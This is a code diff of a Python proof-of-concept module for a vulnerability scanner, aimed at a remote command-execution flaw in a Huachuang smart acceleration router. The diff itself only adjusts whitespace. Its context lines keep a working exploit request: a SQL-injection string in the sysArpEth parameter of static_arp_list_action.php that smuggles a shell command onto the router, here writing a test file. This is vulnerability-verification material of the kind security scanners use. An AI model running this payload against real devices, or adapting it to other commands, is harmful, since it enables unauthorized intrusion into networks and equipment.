@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'AppExNetworks_0003' # 平台漏洞编号，留空
+    vuln_id = 'AppExNetworks_0003'  # 平台漏洞编号，留空
     name = '华创路由器 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         华创智能加速路由器，设计缺陷。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '华创路由器'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '398af65c-929c-4a43-b721-26f9db9a6066'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/acc/bindipmac/static_arp_list_action.php?chkSysArpList[0]=0&sysArpEth[0]=1%27%20and%200%20union%20select%20%27a||echo%20hehehe>testvul.txt||b--&sysArpIp[0]=1&sysArpMac[0]=1'
             verify_url = self.target + payload
             r = requests.get(verify_url)
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
